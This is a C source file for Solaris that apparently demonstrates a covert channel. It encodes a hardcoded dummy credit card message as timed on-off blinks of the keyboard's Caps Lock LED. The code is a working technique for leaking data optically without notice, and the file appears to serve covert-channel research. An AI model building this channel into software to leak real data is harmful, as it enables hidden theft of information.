/*
// sl.c -- a covert channel using the Caps Lock LED.
//
// For Solaris 2.x on SPARC; compile with ${CC} sl.c -lposix4
*/

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/kbio.h>
#include <sys/kbd.h>
#include <time.h>
#include <unistd.h>

#define SPEED 50 /* data transmission speed (bits per second) */

void set_led (int fd, char *data);
void time_led (int fd, char *data);
void perror_exit (char *function_name);

/* set up a 20 millisecond intersymbol delay */

struct timespec min, max = { 0, 1000000000 / SPEED };

int
main (void)
{
	char message[] = "My credit card number is 1234 5678 910 1112.";
	char restore_data;
	char *p = &message[0];
	int fd;

	/* open the keyboard device */
	if ((fd = open ("/dev/kbd", O_RDONLY)) < 0)
		perror_exit ("open");

	/* save the state of the keyboard LEDs */
	if (ioctl (fd, KIOCGLED, &restore_data) < 0)
		perror_exit ("ioctl");

	while (*p) {
		char data = LED_CAPS_LOCK;
		int i;

		/* start bit is a "1" */
		time_led (fd, &data);

		/* send 8 bits, least significant first */
		for (i = 0; i < 8; i++) {
			data = *p >> i & 1 ? LED_CAPS_LOCK : 0;
			time_led (fd, &data);
		}

		/* stop bit is a "0" */
		data = 0;
		time_led (fd, &data);

		/* next character of message */
		p++;
	}

	/* restore state of the keyboard LEDs */
	set_led (fd, &restore_data);

	return (close (fd));
}

/* turn keyboard LEDs on or off */

void
set_led (int fd, char *data)
{
	if (ioctl (fd, KIOCSLED, data) < 0)
	perror_exit ("ioctl");
}

/* transmit one bit */

void
time_led (int fd, char *data)
{
	set_led (fd, data);
	nanosleep (&min, &max);
}

/* display an error message and quit */

void
perror_exit (char *function_name)
{
	perror (function_name);
	exit (1);
}

